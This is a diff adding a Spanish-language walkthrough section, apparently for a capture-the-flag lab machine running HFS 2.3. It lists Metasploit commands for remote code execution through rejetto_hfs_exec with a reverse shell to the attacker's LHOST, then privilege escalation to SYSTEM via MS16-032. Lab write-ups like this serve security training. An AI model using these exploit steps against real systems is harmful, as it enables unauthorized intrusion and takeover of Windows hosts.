@@ -52,7 +52,45 @@ searchsploit HFS 2.3
 
 <figure><img src="../../.gitbook/assets/image (1237).png" alt=""><figcaption></figcaption></figure>
 
+### 🚀 **EXPLOTACIÓN**
+
 Explotamos a través de Metasploit.
 
-cd C:\Users\Administrator\Desktop
+```bash
+use windows/http/rejetto_hfs_exec
+set RHOSTS 10.10.10.8
+set LHOST 10.10.14.7
+run
+background
+```
 
+Estamos dentro del Usuario Kostas por lo que podemos conseguir la flag del user. Buscamos a través de Metasploit que exploit nos recomienda.
+
+### 🔐 **PRIVILEGIOS**
+
+```bash
+use multi/recon/local_exploit_suggerster
+```
+
+Descubrimos uno que nos llama la atención para explotarlo.
+
+{% embed url="https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc/" %}
+
+```bash
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set LHOST 10.10.14.7 
+set session 1  
+exploit
+```
+
+<figure><img src="../../.gitbook/assets/image (1238).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+getuid
+```
+
+<figure><img src="../../.gitbook/assets/image (1239).png" alt=""><figcaption></figcaption></figure>
+
+Ya somos **root**.
+
+<figure><img src="../../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>
